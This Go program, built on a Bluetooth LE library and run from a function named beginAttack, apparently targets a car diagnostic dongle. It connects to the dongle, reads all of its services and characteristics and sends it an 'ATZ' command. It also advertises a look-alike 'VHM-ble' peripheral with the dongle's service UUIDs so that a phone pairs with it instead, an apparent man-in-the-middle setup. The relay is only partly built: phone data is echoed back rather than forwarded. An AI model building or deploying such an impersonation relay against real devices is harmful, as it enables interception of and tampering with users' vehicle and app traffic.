package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"strings"
	"time"

	"github.com/paypal/gatt"
	//"github.com/paypal/gatt/examples/option"
	"github.com/paypal/gatt/examples/service"
)

var done = make(chan struct{})
var gd gatt.Device
var sg gatt.Device
var isPhoneConnected bool

func onStateChanged(d gatt.Device, s gatt.State) {
	fmt.Println("State:", s)
	switch s {
	case gatt.StatePoweredOn:
		fmt.Println("Scanning...")
		d.Scan([]gatt.UUID{}, false)
		return
	default:
		d.StopScanning()
	}
}

func onPeriphDiscovered(p gatt.Peripheral, a *gatt.Advertisement, rssi int) {
	id := strings.ToUpper(flag.Args()[0])
	if strings.ToUpper(p.ID()) != id {
		return
	}

	// Stop scanning once we've got the peripheral we're looking for.
	p.Device().StopScanning()
	fmt.Printf("\nPeripheral ID:%s, NAME:(%s)\n", p.ID(), p.Name())
	fmt.Println("  Local Name        =", a.LocalName)
	fmt.Println("  TX Power Level    =", a.TxPowerLevel)
	fmt.Println("  Manufacturer Data =", a.ManufacturerData)
	fmt.Println("  Service Data      =", a.ServiceData)
	fmt.Println("")

	p.Device().Connect(p)
}

func onPeriphConnected(p gatt.Peripheral, err error) {
	fmt.Println("Connected to Dongle")
	go connectToPhone()
	for isPhoneConnected == false {
		// Will not continue until phone connection has been established.
	}
	defer p.Device().CancelConnection(p)

	if err := p.SetMTU(500); err != nil {
		fmt.Printf("Failed to set MTU, err: %s\n", err)
	}

	// Discovery services
	ss, err := p.DiscoverServices(nil)
	if err != nil {
		fmt.Printf("Failed to discover services, err: %s\n", err)
		return
	}

	for _, s := range ss {
		msg := "Service: " + s.UUID().String()
		if len(s.Name()) > 0 {
			msg += " (" + s.Name() + ")"
		}
		fmt.Println(msg)

		// Discovery characteristics
		cs, err := p.DiscoverCharacteristics(nil, s)
		if err != nil {
			fmt.Printf("Failed to discover characteristics, err: %s\n", err)
			continue
		}

		for _, c := range cs {
			msg := "  Characteristic  " + c.UUID().String()
			if len(c.Name()) > 0 {
				msg += " (" + c.Name() + ")"
			}
			msg += "\n    properties    " + c.Properties().String()
			fmt.Println(msg)

			// Read the characteristic, if possible.
			if (c.Properties() & gatt.CharRead) != 0 {
				b, err := p.ReadCharacteristic(c)
				if err != nil {
					fmt.Printf("Failed to read characteristic, err: %s\n", err)
					continue
				}
				fmt.Printf("    value         %x | %q\n", b, b)
			}

			// Discovery descriptors
			ds, err := p.DiscoverDescriptors(nil, c)
			if err != nil {
				fmt.Printf("Failed to discover descriptors, err: %s\n", err)
				continue
			}

			for _, d := range ds {
				msg := "  Descriptor      " + d.UUID().String()
				if len(d.Name()) > 0 {
					msg += " (" + d.Name() + ")"
				}
				fmt.Println(msg)

				// Read descriptor (could fail, if it's not readable)
				b, err := p.ReadDescriptor(d)
				if err != nil {
					fmt.Printf("Failed to read descriptor, err: %s\n", err)
					continue
				}
				fmt.Printf("    value         %x | %q\n", b, b)
			}
			// Write to Dongle
			if (strings.Contains(c.Properties().String(), "write")) {
				fmt.Println("| Ready to write commands towards dongle ... ")
				p.WriteCharacteristic(c, []byte("ATZ\r>"), false)
			}

			// Subscribe the characteristic, if possible.
			if (c.Properties() & (gatt.CharNotify | gatt.CharIndicate)) != 0 {
				f := func(c *gatt.Characteristic, b []byte, err error) {
					fmt.Printf("notified: % X | %q\n", b, b)
				}
				if err := p.SetNotifyValue(c, f); err != nil {
					fmt.Printf("Failed to subscribe characteristic, err: %s\n", err)
					continue
				}
			}

		}
	}

	fmt.Printf("Waiting for 120 seconds to get some notifiations, if any.\n")
	time.Sleep(120 * time.Second)
}

func onPeriphDisconnected(p gatt.Peripheral, err error) {
	fmt.Println("Dongle is disconnected")
	connectToDongle()
	//close(done) // NEVER CLOSE
}
func NewCountTestService() *gatt.Service {

	s := gatt.NewService(gatt.MustParseUUID("0000fff0-0000-1000-8000-00805f9b34fb"))

	var phone gatt.Notifier

	s.AddCharacteristic(gatt.MustParseUUID("0000fff1-0000-1000-8000-00805f9b34fb")).HandleNotifyFunc(
		func(r gatt.Request, n gatt.Notifier) {
			go func() {
				log.Printf("TODO: indicate client when the services are changed 2 ")
				phone = n
			}()
		})
	s.AddCharacteristic(gatt.MustParseUUID("0000fff2-0000-1000-8000-00805f9b34fb")).HandleWriteFunc(
		func(r gatt.Request, data []byte) (status byte) {
			isPhoneConnected = true
			fmt.Println("| Ready to handle data from phone")
			fmt.Println("| Phone sent: " + string(data))
			phone.Write(data)
			return gatt.StatusSuccess
		})
	return s
}


func connectToPhone() {
	gd.Handle(
		gatt.CentralConnected(func(c gatt.Central) {
			fmt.Println("| Phone is connected, connections id: ", c.ID())
		}),
		gatt.CentralDisconnected(func(c gatt.Central) { fmt.Println("| Phone is disconnected: ", c.ID()); isPhoneConnected = false }),
	)
	// A mandatory handler for monitoring device state.
	onStateChanged := func(d gatt.Device, s gatt.State) {
		//fmt.Printf("State: %s\n", s)
		switch s {
		case gatt.StatePoweredOn:
			// Setup GAP and GATT services for Linux implementation.
			// OS X doesn't export the access of these services.
			d.AddService(service.NewGapService("VHM-ble")) // no effect on OS X
			d.AddService(service.NewGattService())         // no effect on OS X

			// A simple count service for demo.
			s1 := NewCountTestService()
			d.AddService(s1)

			// Advertise device name and service's UUIDs.
			d.AdvertiseNameAndServices("VHM-ble", []gatt.UUID{s1.UUID()})

			// Advertise as an OpenBeacon iBeacon
			d.AdvertiseIBeacon(gatt.MustParseUUID("AA6062F098CA42118EC4193EB73CCEB6"), 1, 2, -59)

		default:
		}

	}
	gd.Init(onStateChanged)
	select {}
}

func connectToDongle() {
	flag.Parse()
	if len(flag.Args()) != 1 {
		log.Fatalf("usage: %s [options] peripheral-id\n", os.Args[0])
	}

	// Register handlers.
	gd.Handle(
		gatt.PeripheralDiscovered(onPeriphDiscovered),
		gatt.PeripheralConnected(onPeriphConnected),
		gatt.PeripheralDisconnected(onPeriphDisconnected),
	)

	gd.Init(onStateChanged)
	<-done
	fmt.Println("Done")
}



func beginAttack() {
	gattDev, err := gatt.NewDevice(gatt.LnxMaxConnections(2))
	if err != nil {
		log.Fatalf("Failed to open device, err: %s", err)
	}
	gd = gattDev
	connectToDongle()
	
}


func main() {
	isPhoneConnected = false
	beginAttack()
}


